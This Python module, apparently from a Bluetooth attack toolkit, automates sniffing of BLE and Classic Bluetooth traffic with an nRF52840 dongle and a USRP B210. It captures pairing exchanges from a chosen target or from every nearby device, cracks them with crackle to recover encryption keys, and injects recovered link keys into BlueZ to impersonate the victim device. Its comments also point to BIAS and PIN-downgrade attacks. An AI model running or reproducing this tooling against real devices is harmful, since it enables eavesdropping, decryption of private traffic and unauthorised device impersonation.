"""nRF52840 + USRP B210 integration for BLE/BR-EDR capture and link key cracking.

Hardware:
  - nRF52840 dongle — BLE sniffing via Nordic's nRF Sniffer for Bluetooth LE.
    Requires sniffer firmware flashed onto the dongle (see Nordic Semiconductor
    "nRF Sniffer for Bluetooth LE" documentation). Interfaces with Wireshark/tshark
    through the nrf_sniffer_ble extcap plugin, or via nrfutil CLI.

  - USRP B210 SDR — wideband 2.4 GHz capture for BR/EDR baseband sniffing.
    Requires UHD drivers (uhd_find_devices, uhd_rx_cfile) and gr-bluetooth
    GNU Radio module for real-time BR/EDR decoding. Raw IQ capture is always
    available as a fallback for offline analysis.

Workflow (BLE — nRF52840):
  1. Scan for BLE advertisers (nrf_sniffer_ble extcap via tshark)
  2. Sniff target BLE connection / pairing exchange
  3. Crack captured pairing to extract LTK (crackle)

Workflow (BR/EDR — USRP B210):
  1. Scan for active piconets (raw IQ + gr-bluetooth btbb_rx)
  2. Follow target piconet and capture traffic
  3. Extract link key from captured LMP frames (tshark)
  4. Inject link key into BlueZ for impersonation

CrackleRunner works on BLE pcaps from any capture source.
LinkKeyExtractor works on BR/EDR pcaps from any capture source.

Software required:
  - tshark (Wireshark CLI) with nrf_sniffer_ble extcap plugin
  - nrfutil (optional, alternative to tshark for nRF52840 sniffing)
  - uhd (UHD drivers: uhd_find_devices, uhd_rx_cfile)
  - gr-bluetooth (btbb_rx, btrx — optional, for real-time BR/EDR decoding)
  - crackle (BLE pairing cracker)

References:
  - https://infocenter.nordicsemi.com/topic/ug_sniffer_ble/
  - https://www.ettus.com/all-products/ub210-kit/
  - https://github.com/greatscottgadgets/gr-bluetooth
  - https://github.com/mikeryan/crackle
  - Ryan, M. "Bluetooth: With Low Energy Comes Low Security" USENIX WOOT 2013
"""

import os
import re
import time
import signal
import subprocess

from blue_tap.utils.bt_helpers import run_cmd, check_tool
from blue_tap.utils.output import (
    info, success, error, warning, verbose,
    phase, step, substep,
)


# ── nRF52840 BLE Sniffer ──────────────────────────────────────────────────

class NRFBLESniffer:
    """BLE sniffer using nRF52840 dongle with Nordic sniffer firmware.

    Uses the nrf_sniffer_ble Wireshark extcap interface (via tshark) to
    capture BLE advertisements, connections, and pairing exchanges. Falls
    back to nrfutil CLI if the extcap plugin is not available.
    """

    def __init__(self):
        self._proc = None

    @staticmethod
    def is_available() -> bool:
        """Check if nRF52840 sniffer tools are installed."""
        # Check for tshark with nrf_sniffer_ble extcap, or nrfutil
        if check_tool("tshark"):
            # Verify the extcap interface exists
            result = run_cmd(["tshark", "-D"], timeout=10)
            if result.returncode == 0 and "nrf_sniffer_ble" in result.stdout:
                return True
        return check_tool("nrfutil")

    def scan_advertisers(self, duration: int = 30) -> list[dict]:
        """Scan for BLE advertisers using nRF52840 sniffer.

        Captures BLE advertisement packets and extracts advertising
        addresses and device names.

        Returns list of discovered advertisers with address and name.
        """
        if not check_tool("tshark"):
            error("tshark not found. Install: apt install wireshark-cli")
            return []

        with phase("nRF52840 BLE Advertisement Scan"):
            info(f"Scanning for BLE advertisers ({duration}s)...")
            info("Listening on nrf_sniffer_ble extcap interface")

            result = run_cmd(
                [
                    "tshark",
                    "-i", "nrf_sniffer_ble",
                    "-a", f"duration:{duration}",
                    "-Y", "btle.advertising_header",
                    "-T", "fields",
                    "-e", "btle.advertising_address",
                    "-e", "btcommon.eir_ad.entry.device_name",
                ],
                timeout=duration + 15,
            )

            advertisers = []
            if result.returncode == 0 and result.stdout:
                for line in result.stdout.splitlines():
                    parts = line.split("\t")
                    addr = parts[0].strip() if len(parts) >= 1 else ""
                    name = parts[1].strip() if len(parts) >= 2 else ""
                    if addr:
                        entry = {
                            "address": addr.upper(),
                            "name": name or "(unknown)",
                            "raw": line.strip(),
                        }
                        # Deduplicate by address
                        if not any(a["address"] == entry["address"] for a in advertisers):
                            advertisers.append(entry)

                success(f"Found {len(advertisers)} BLE advertiser(s)")
                for a in advertisers:
                    substep(f"{a['address']}  {a['name']}")
            else:
                warning("No BLE advertisers detected (check nRF52840 dongle connection)")
                if result.stderr:
                    verbose(f"stderr: {result.stderr.strip()}")

        return advertisers

    def sniff_connection(
        self,
        target_address: str,
        output_pcap: str = "ble_connection.pcap",
        duration: int = 120,
    ) -> dict:
        """Capture BLE connection to/from a target address.

        Sniffs BLE link-layer traffic involving the target device using
        the nRF52840 sniffer. Output pcap can be analyzed with Wireshark
        or fed to CrackleRunner if pairing was captured.

        Args:
            target_address: Target BLE address (e.g., AA:BB:CC:DD:EE:FF).
            output_pcap: Output pcap file path.
            duration: Capture duration in seconds.
        """
        with phase("nRF52840 BLE Connection Sniff"):
            info(f"Sniffing BLE connection for {target_address} ({duration}s)")
            info(f"Output: {output_pcap}")

            # Prefer tshark with extcap, fall back to nrfutil
            if check_tool("tshark"):
                return self._sniff_via_tshark(target_address, output_pcap, duration)
            elif check_tool("nrfutil"):
                return self._sniff_via_nrfutil(target_address, output_pcap, duration)
            else:
                error("Neither tshark (with nrf_sniffer_ble) nor nrfutil found")
                return {"success": False, "error": "no sniffer tool available"}

    def sniff_pairing(
        self,
        output_pcap: str = "ble_pairing.pcap",
        duration: int = 120,
        target: str | None = None,
    ) -> dict:
        """Capture BLE pairing exchanges for key cracking.

        Captures BLE link-layer traffic including SMP pairing frames
        (Pairing Request, Pairing Response, Pairing Confirm, Pairing Random,
        Encryption Information, Master Identification). The output pcap can
        be fed directly to CrackleRunner.crack_ble() to recover the TK/LTK.

        Args:
            output_pcap: Output pcap file path.
            duration: Capture duration in seconds.
            target: Optional target BLE address to filter on.
                   If None, captures all pairing exchanges (promiscuous).
        """
        with phase("BLE Pairing Sniff"):
            if target:
                info(f"Sniffing BLE pairing for {target} ({duration}s)")
            else:
                info(f"Sniffing all BLE pairing exchanges ({duration}s, promiscuous)")
            info(f"Output: {output_pcap}")

            if check_tool("tshark"):
                return self._sniff_via_tshark(target, output_pcap, duration)
            elif check_tool("nrfutil"):
                if target:
                    return self._sniff_via_nrfutil(target, output_pcap, duration)
                else:
                    # nrfutil requires an address; capture all with no filter
                    return self._sniff_via_nrfutil(None, output_pcap, duration)
            else:
                error("Neither tshark (with nrf_sniffer_ble) nor nrfutil found")
                return {"success": False, "error": "no sniffer tool available"}

    def _sniff_via_tshark(
        self,
        target_address: str | None,
        output_pcap: str,
        duration: int,
    ) -> dict:
        """Capture BLE traffic using tshark with nrf_sniffer_ble extcap."""
        cmd = [
            "tshark",
            "-i", "nrf_sniffer_ble",
            "-a", f"duration:{duration}",
            "-w", output_pcap,
        ]
        if target_address:
            # Two-pass approach: capture all packets, then filter.
            # -Y (display filter) does NOT filter what -w writes to the pcap;
            # -f (capture/BPF filter) doesn't support btle.* display-filter syntax.
            # So we capture everything first, then filter with a second tshark pass.
            addr_filter = target_address.lower().replace("-", ":")
            self._pending_filter = f"btle.advertising_address == {addr_filter}"
        else:
            self._pending_filter = None

        with step("Capturing BLE link layer via tshark"):
            try:
                self._proc = subprocess.Popen(
                    cmd,
                    stdout=subprocess.DEVNULL,
                    stderr=subprocess.DEVNULL,
                )
                info(f"tshark capture started (PID {self._proc.pid})")

                try:
                    self._proc.wait(timeout=duration + 10)
                except subprocess.TimeoutExpired:
                    self._proc.send_signal(signal.SIGINT)
                    self._proc.wait(timeout=5)

            except FileNotFoundError:
                error("tshark binary not found")
                return {"success": False, "error": "binary not found"}
            except Exception as e:
                error(f"Capture error: {e}")
                return {"success": False, "error": str(e)}
            finally:
                self._proc = None

        # Second pass: filter the pcap if a target address was specified
        if self._pending_filter and os.path.exists(output_pcap):
            filtered_pcap = output_pcap + ".filtered"
            filter_cmd = [
                "tshark", "-r", output_pcap,
                "-Y", self._pending_filter,
                "-w", filtered_pcap,
            ]
            try:
                filter_result = subprocess.run(
                    filter_cmd,
                    stdout=subprocess.DEVNULL,
                    stderr=subprocess.PIPE,
                    timeout=60,
                )
                if filter_result.returncode == 0 and os.path.exists(filtered_pcap):
                    os.replace(filtered_pcap, output_pcap)
                    info("Filtered pcap to target address only")
                else:
                    warning("Post-capture filter failed; pcap contains all packets")
                    if os.path.exists(filtered_pcap):
                        os.remove(filtered_pcap)
            except (subprocess.TimeoutExpired, OSError) as e:
                warning(f"Post-capture filter error: {e}")
                if os.path.exists(filtered_pcap):
                    os.remove(filtered_pcap)

        return self._check_pcap_output(output_pcap, duration, target_address)

    def _sniff_via_nrfutil(
        self,
        target_address: str | None,
        output_pcap: str,
        duration: int,
    ) -> dict:
        """Capture BLE traffic using nrfutil ble-sniffer."""
        cmd = ["nrfutil", "ble-sniffer", "sniff", "--output", output_pcap]
        if target_address:
            addr = target_address.upper().replace("-", ":")
            cmd.extend(["--address", addr])

        with step("Capturing BLE link layer via nrfutil"):
            try:
                self._proc = subprocess.Popen(
                    cmd,
                    stdout=subprocess.DEVNULL,
                    stderr=subprocess.DEVNULL,
                )
                info(f"nrfutil capture started (PID {self._proc.pid})")

                try:
                    self._proc.wait(timeout=duration)
                except subprocess.TimeoutExpired:
                    self._proc.send_signal(signal.SIGINT)
                    self._proc.wait(timeout=5)

            except FileNotFoundError:
                error("nrfutil binary not found")
                return {"success": False, "error": "binary not found"}
            except Exception as e:
                error(f"Capture error: {e}")
                return {"success": False, "error": str(e)}
            finally:
                self._proc = None

        return self._check_pcap_output(output_pcap, duration, target_address)

    def _check_pcap_output(
        self, output_pcap: str, duration: int, target: str | None
    ) -> dict:
        """Check if pcap output was produced and report results."""
        if os.path.exists(output_pcap):
            size = os.path.getsize(output_pcap)
            success(f"Captured {size} bytes to {output_pcap}")
            result = {
                "success": True,
                "pcap": output_pcap,
                "size": size,
                "duration": duration,
            }
            if target:
                result["target"] = target
            return result
        else:
            warning("No pcap file produced (no BLE traffic captured?)")
            return {"success": False, "error": "no output file"}

    def stop(self):
        """Stop any running capture."""
        if self._proc:
            try:
                self._proc.send_signal(signal.SIGINT)
                self._proc.wait(timeout=5)
            except (ProcessLookupError, subprocess.TimeoutExpired):
                try:
                    self._proc.kill()
                except ProcessLookupError:
                    pass
            self._proc = None
            info("nRF52840 BLE capture stopped")


# ── USRP B210 BR/EDR Capture ──────────────────────────────────────────────

class USRPCapture:
    """BR/EDR sniffer using USRP B210 SDR.

    Uses UHD drivers for raw IQ capture at 2.4 GHz and gr-bluetooth
    (btbb_rx, btrx) for real-time BR/EDR baseband decoding. If gr-bluetooth
    is not available, raw IQ files can be captured for offline processing
    with GNU Radio.
    """

    def __init__(self, freq: float = 2.402e9, gain: float = 40):
        self._proc = None
        self.freq = freq
        self.gain = gain

    @staticmethod
    def is_available() -> bool:
        """Check if USRP/UHD tools are installed."""
        return check_tool("uhd_find_devices")

    def scan_piconets(self, duration: int = 30) -> list[dict]:
        """Scan for active BR/EDR piconets using USRP B210.

        If gr-bluetooth btbb_rx is available, uses it for real-time
        piconet detection. Otherwise, captures raw IQ and notes that
        manual processing is needed.

        Returns list of discovered piconets with LAP, UAP, and signal info.
        """
        if not self.is_available():
            error("uhd_find_devices not found. Install UHD drivers: apt install uhd-host")
            return []

        with phase("USRP B210 Piconet Scan"):
            info(f"Scanning for active BR/EDR piconets ({duration}s)...")
            info(f"Center frequency: {self.freq / 1e6:.1f} MHz, Gain: {self.gain} dB")

            if check_tool("btbb_rx"):
                return self._scan_via_btbb_rx(duration)
            else:
                warning("gr-bluetooth btbb_rx not found — falling back to raw IQ capture")
                info("Install gr-bluetooth for real-time piconet detection")
                raw_file = f"piconet_scan_{int(time.time())}.cfile"
                result = self.capture_raw_iq(raw_file, duration=duration)
                if result["success"]:
                    info(f"Raw IQ saved to {raw_file}")
                    info("Process with GNU Radio / gr-bluetooth offline:")
                    info(f"  btbb_rx -f {raw_file}")
                return []

    def _scan_via_btbb_rx(self, duration: int) -> list[dict]:
        """Scan for piconets using gr-bluetooth btbb_rx."""
        with step("Scanning via btbb_rx"):
            result = run_cmd(
                [
                    "btbb_rx",
                    "--freq", str(self.freq),
                    "--gain", str(int(self.gain)),
                    "--duration", str(duration),
                ],
                timeout=duration + 15,
            )

            piconets = []
            if result.returncode == 0 and result.stdout:
                for line in result.stdout.splitlines():
                    # Parse LAP/UAP from btbb_rx output
                    lap_m = re.search(r"LAP[=:\s]+([0-9A-Fa-f]{6})", line)
                    uap_m = re.search(r"UAP[=:\s]+([0-9A-Fa-f]{2})", line)
                    if lap_m:
                        entry = {
                            "lap": lap_m.group(1).upper(),
                            "uap": uap_m.group(1).upper() if uap_m else "??",
                            "raw": line.strip(),
                        }
                        # Deduplicate by LAP
                        if not any(p["lap"] == entry["lap"] for p in piconets):
                            piconets.append(entry)

                success(f"Found {len(piconets)} active piconet(s)")
                for p in piconets:
                    substep(f"LAP: {p['lap']}  UAP: {p['uap']}")
            else:
                warning("No piconets detected (check USRP B210 connection)")
                if result.stderr:
                    verbose(f"stderr: {result.stderr.strip()}")

        return piconets

    def follow_piconet(
        self,
        target_address: str,
        output_pcap: str = "bt_capture.pcap",
        duration: int = 120,
    ) -> dict:
        """Follow a specific BR/EDR piconet and capture traffic to pcap.

        Uses the LAP (lower 24 bits of BD_ADDR) to decode the target's
        frequency hopping sequence via gr-bluetooth. If gr-bluetooth is
        not available, captures raw IQ for offline processing.

        Args:
            target_address: Target BD_ADDR (AA:BB:CC:DD:EE:FF).
                           LAP is extracted from the lower 3 octets.
            output_pcap: Output pcap file path.
            duration: Capture duration in seconds.
        """
        if not self.is_available():
            error("UHD drivers not found. Install: apt install uhd-host")
            return {"success": False, "error": "UHD not installed"}

        # Extract LAP from MAC address (lower 3 bytes)
        octets = target_address.replace("-", ":").split(":")
        if len(octets) != 6:
            error(f"Invalid MAC address: {target_address}")
            return {"success": False, "error": "invalid MAC"}
        lap = "".join(octets[3:6])  # Last 3 octets = LAP

        with phase("USRP B210 Piconet Follow"):
            info(f"Following piconet LAP={lap} for {duration}s")
            info(f"Output: {output_pcap}")

            if check_tool("btrx"):
                return self._follow_via_btrx(lap, output_pcap, duration)
            else:
                warning("gr-bluetooth btrx not found — capturing raw IQ instead")
                raw_file = output_pcap.replace(".pcap", ".cfile")
                result = self.capture_raw_iq(raw_file, duration=duration)
                if result["success"]:
                    info(f"Raw IQ saved to {raw_file}")
                    info("Decode offline with gr-bluetooth:")
                    info(f"  btrx -f {raw_file} -l {lap} -o {output_pcap}")
                    result["note"] = "raw IQ captured; decode offline with btrx"
                    result["lap"] = lap
                return result

    def _follow_via_btrx(
        self, lap: str, output_pcap: str, duration: int
    ) -> dict:
        """Follow piconet using gr-bluetooth btrx."""
        cmd = [
            "btrx",
            "--lap", lap,
            "--freq", str(self.freq),
            "--gain", str(int(self.gain)),
            "--output", output_pcap,
        ]

        with step("Capturing piconet traffic via btrx"):
            try:
                self._proc = subprocess.Popen(
                    cmd,
                    stdout=subprocess.DEVNULL,
                    stderr=subprocess.DEVNULL,
                )
                info(f"btrx capture started (PID {self._proc.pid})")

                try:
                    self._proc.wait(timeout=duration)
                except subprocess.TimeoutExpired:
                    self._proc.send_signal(signal.SIGINT)
                    self._proc.wait(timeout=5)

            except FileNotFoundError:
                error("btrx binary not found")
                return {"success": False, "error": "binary not found"}
            except Exception as e:
                error(f"Capture error: {e}")
                return {"success": False, "error": str(e)}
            finally:
                self._proc = None

        # Check output
        if os.path.exists(output_pcap):
            size = os.path.getsize(output_pcap)
            success(f"Captured {size} bytes to {output_pcap}")
            return {
                "success": True,
                "pcap": output_pcap,
                "size": size,
                "duration": duration,
                "lap": lap,
            }
        else:
            warning("No pcap file produced (no traffic captured?)")
            return {"success": False, "error": "no output file"}

    def capture_raw_iq(
        self,
        output_file: str = "bt_capture.cfile",
        duration: int = 60,
        freq: float | None = None,
        rate: float = 4e6,
    ) -> dict:
        """Capture raw IQ samples from USRP B210 for offline analysis.

        This is the most flexible capture mode — raw IQ can be processed
        with any GNU Radio flowgraph, gr-bluetooth, or custom demodulators.

        Args:
            output_file: Output file path (complex float32 IQ samples).
            duration: Capture duration in seconds.
            freq: Center frequency in Hz (default: self.freq).
            rate: Sample rate in Hz (default: 4 MHz).
        """
        if not self.is_available():
            error("UHD drivers not found. Install: apt install uhd-host")
            return {"success": False, "error": "UHD not installed"}

        capture_freq = freq if freq is not None else self.freq

        with phase("USRP B210 Raw IQ Capture"):
            info(f"Capturing raw IQ for {duration}s")
            info(f"Frequency: {capture_freq / 1e6:.1f} MHz, Rate: {rate / 1e6:.1f} MS/s")
            info(f"Output: {output_file}")

            cmd = [
                "uhd_rx_cfile",
                "--freq", str(capture_freq),
                "--samp-rate", str(rate),
                "--gain", str(int(self.gain)),
                "--duration", str(duration),
                output_file,
            ]

            with step("Capturing raw IQ samples"):
                try:
                    self._proc = subprocess.Popen(
                        cmd,
                        stdout=subprocess.PIPE,
                        stderr=subprocess.PIPE,
                    )
                    info(f"uhd_rx_cfile started (PID {self._proc.pid})")

                    try:
                        self._proc.wait(timeout=duration + 15)
                    except subprocess.TimeoutExpired:
                        self._proc.send_signal(signal.SIGINT)
                        self._proc.wait(timeout=5)

                except FileNotFoundError:
                    error("uhd_rx_cfile not found. Install: apt install uhd-host")
                    return {"success": False, "error": "uhd_rx_cfile not found"}
                except Exception as e:
                    error(f"Capture error: {e}")
                    return {"success": False, "error": str(e)}
                finally:
                    self._proc = None

            if os.path.exists(output_file):
                size = os.path.getsize(output_file)
                # uhd_rx_cfile writes complex float32 = 8 bytes/sample (I+Q as float32)
                samples = size // 8
                success(f"Captured {size} bytes ({samples:,} complex float32 samples)")
                return {
                    "success": True,
                    "file": output_file,
                    "size": size,
                    "duration": duration,
                    "freq": capture_freq,
                    "rate": rate,
                }
            else:
                warning("No output file produced")
                return {"success": False, "error": "no output file"}

    def stop(self):
        """Stop any running capture."""
        if self._proc:
            try:
                self._proc.send_signal(signal.SIGINT)
                self._proc.wait(timeout=5)
            except (ProcessLookupError, subprocess.TimeoutExpired):
                try:
                    self._proc.kill()
                except ProcessLookupError:
                    pass
            self._proc = None
            info("USRP B210 capture stopped")


# ── Crackle Link Key Cracker ────────────────────────────────────────────────

class CrackleRunner:
    """Wrapper for Crackle — BLE pairing cracker.

    Crackle recovers the Temporary Key (TK) and Long Term Key (LTK) from
    a captured BLE pairing exchange. For Legacy Pairing (BT 4.0-4.1),
    the TK is 0 for Just Works or a 6-digit PIN for Passkey Entry —
    both trivially crackable.

    For LE Secure Connections (BT 4.2+), Crackle cannot crack the pairing
    directly, but can decrypt traffic if the TK/LTK is known.

    Limitations:
      - Only works on BLE (not Classic BR/EDR)
      - Requires captured pairing exchange (not just encrypted traffic)
      - LE Secure Connections with Numeric Comparison is NOT crackable
    """

    @staticmethod
    def is_available() -> bool:
        return check_tool("crackle")

    def crack_ble(self, pcap_file: str, output_pcap: str | None = None) -> dict:
        """Run Crackle on a captured BLE pairing exchange.

        Args:
            pcap_file: Input pcap with BLE pairing traffic.
            output_pcap: Optional output pcap with decrypted traffic.

        Returns:
            Dict with tk, ltk, success status, and crackle output.
        """
        if not self.is_available():
            error("crackle not found. Install: https://github.com/mikeryan/crackle")
            return {"success": False, "error": "crackle not installed"}

        if not os.path.exists(pcap_file):
            error(f"Pcap file not found: {pcap_file}")
            return {"success": False, "error": "file not found"}

        with phase("BLE Key Cracking"):
            cmd = ["crackle", "-i", pcap_file]
            if output_pcap:
                cmd.extend(["-o", output_pcap])
                info(f"Decrypted output: {output_pcap}")

            info(f"Running Crackle on {pcap_file}...")

            with step("Cracking BLE Temporary Key"):
                result = run_cmd(cmd, timeout=300)

            output = result.stdout + result.stderr
            verbose(f"Crackle output:\n{output}")

            parsed = self._parse_crackle_output(output)

            if parsed.get("tk"):
                success(f"TK recovered: {parsed['tk']}")
            if parsed.get("ltk"):
                success(f"LTK recovered: {parsed['ltk']}")
            if parsed.get("success"):
                success("Pairing cracked successfully")
            else:
                if "Secure Connections" in output:
                    warning("LE Secure Connections detected — not crackable by Crackle")
                elif "no pairing" in output.lower():
                    warning("No pairing exchange found in capture")
                else:
                    warning("Crackle did not recover keys")

        return parsed

    def _parse_crackle_output(self, output: str) -> dict:
        """Parse Crackle stdout for recovered keys."""
        result = {
            "success": False,
            "tk": None,
            "ltk": None,
            "raw_output": output,
        }

        # Crackle output patterns:
        # "TK found: 000000"
        # "LTK found: aabbccdd..."
        # "Successfully cracked"
        tk_m = re.search(r"TK\s*(?:found|=)[:\s]+([0-9A-Fa-f]+)", output)
        if tk_m:
            result["tk"] = tk_m.group(1)

        ltk_m = re.search(r"LTK\s*(?:found|=)[:\s]+([0-9A-Fa-f]+)", output)
        if ltk_m:
            result["ltk"] = ltk_m.group(1)

        if result["tk"] or result["ltk"] or "successfully" in output.lower():
            result["success"] = True

        return result


# ── BR/EDR Link Key Extraction ──────────────────────────────────────────────

class LinkKeyExtractor:
    """Extract and inject BR/EDR link keys for Classic Bluetooth impersonation.

    After capturing a BR/EDR pairing exchange (via USRP B210), the link key
    can sometimes be derived from the captured LMP packets. This class also
    handles injecting recovered link keys into BlueZ's storage so that
    bluetoothctl can connect using the stolen key.

    BlueZ stores link keys in:
      /var/lib/bluetooth/<adapter_mac>/<remote_mac>/info

    The [LinkKey] section contains:
      Key=<hex_key>
      Type=<type>
      PINLength=<length>
    """

    BLUEZ_BT_DIR = "/var/lib/bluetooth"

    def extract_from_pcap(self, pcap_file: str) -> dict:
        """Attempt to extract BR/EDR link key from captured pairing pcap.

        Uses tshark to parse LMP pairing frames. Only works if the full
        pairing exchange was captured (both Kinit and link key derivation).

        Note: This is opportunistic. BR/EDR E21/E22 key derivation from
        captured traffic requires knowing or brute-forcing the PIN. For
        SSP (Secure Simple Pairing), the ECDH exchange means passive
        sniffing alone cannot recover the link key.
        """
        if not check_tool("tshark"):
            warning("tshark not found — cannot parse pcap for link keys")
            return {"success": False, "error": "tshark not installed"}

        if not os.path.exists(pcap_file):
            error(f"Pcap not found: {pcap_file}")
            return {"success": False, "error": "file not found"}

        with phase("BR/EDR Link Key Extraction"):
            info(f"Analyzing {pcap_file} for pairing frames...")

            # Extract LMP pairing-related frames
            result = run_cmd([
                "tshark", "-r", pcap_file,
                "-Y", "btlmp.op == 11 || btlmp.op == 12 || btlmp.op == 17",
                "-T", "fields",
                "-e", "btlmp.op",
                "-e", "btlmp.key",
            ], timeout=30)

            if result.returncode != 0:
                warning(f"tshark failed: {result.stderr.strip()}")
                return {"success": False, "error": "tshark parse failed"}

            # Look for key material in output
            keys = []
            for line in result.stdout.splitlines():
                parts = line.split("\t")
                if len(parts) >= 2 and parts[1]:
                    key_hex = parts[1].replace(":", "").strip()
                    if len(key_hex) == 32:  # 128-bit link key
                        keys.append(key_hex.upper())

            if keys:
                success(f"Found {len(keys)} potential link key(s)")
                return {"success": True, "keys": keys}
            else:
                info("No complete link keys found in capture")
                info("BR/EDR SSP uses ECDH — passive sniffing alone may not suffice")
                info("Consider: BIAS attack, or force re-pairing with downgraded PIN")
                return {"success": False, "keys": [], "note": "SSP ECDH prevents passive extraction"}

    def inject_link_key(
        self,
        adapter_mac: str,
        remote_mac: str,
        link_key: str,
        key_type: int = 4,
    ) -> bool:
        """Inject a link key into BlueZ storage for a remote device.

        This allows bluetoothctl to connect to the remote device using the
        injected key, bypassing the normal pairing process.

        Args:
            adapter_mac: Local adapter MAC (e.g., from hciconfig).
            remote_mac: Remote device MAC.
            link_key: 128-bit hex link key (32 hex chars).
            key_type: BlueZ key type (4=authenticated, 5=unauthenticated).
        """
        if len(link_key) != 32:
            error(f"Link key must be 32 hex chars, got {len(link_key)}")
            return False

        adapter_dir = adapter_mac.upper().replace("-", ":")
        remote_dir = remote_mac.upper().replace("-", ":")

        info_dir = os.path.join(self.BLUEZ_BT_DIR, adapter_dir, remote_dir)
        info_file = os.path.join(info_dir, "info")

        with phase("Link Key Injection"):
            with step(f"Injecting key into BlueZ for {remote_mac}"):
                os.makedirs(info_dir, exist_ok=True)

                # Read existing info file if present
                existing = ""
                if os.path.exists(info_file):
                    with open(info_file) as f:
                        existing = f.read()

                # Update or add [LinkKey] section
                key_section = f"[LinkKey]\nKey={link_key.upper()}\nType={key_type}\nPINLength=0\n"

                if "[LinkKey]" in existing:
                    # Replace existing LinkKey section — parse line by line
                    # to avoid fragile regex across section boundaries
                    lines = existing.splitlines(keepends=True)
                    new_lines = []
                    in_linkkey = False
                    replaced = False
                    for ln in lines:
                        if ln.strip() == "[LinkKey]":
                            in_linkkey = True
                            if not replaced:
                                new_lines.append(key_section)
                                replaced = True
                            continue
                        if in_linkkey:
                            # Skip old LinkKey lines until next section or EOF
                            if ln.strip().startswith("[") and ln.strip() != "[LinkKey]":
                                in_linkkey = False
                                new_lines.append(ln)
                            # else: skip this line (old key data)
                            continue
                        new_lines.append(ln)
                    new_content = "".join(new_lines)
                else:
                    new_content = existing.rstrip() + "\n\n" + key_section

                with open(info_file, "w") as f:
                    f.write(new_content)

                success(f"Link key injected: {info_file}")
                info("Restart bluetoothd for changes to take effect:")
                info("  sudo systemctl restart bluetooth")

            # Restart BlueZ to pick up the new key
            with step("Restarting BlueZ daemon"):
                result = run_cmd(["sudo", "systemctl", "restart", "bluetooth"], timeout=10)
                if result.returncode == 0:
                    success("BlueZ restarted — link key active")
                    time.sleep(2)  # Wait for daemon
                else:
                    warning("Could not restart BlueZ (may need manual restart)")

        return True

    def get_adapter_mac(self, hci: str = "hci0") -> str | None:
        """Get the current MAC address of the local adapter."""
        result = run_cmd(["hciconfig", hci], timeout=5)
        if result.returncode == 0:
            m = re.search(r"BD Address:\s*([0-9A-Fa-f:]{17})", result.stdout)
            if m:
                return m.group(1).upper()
        return None
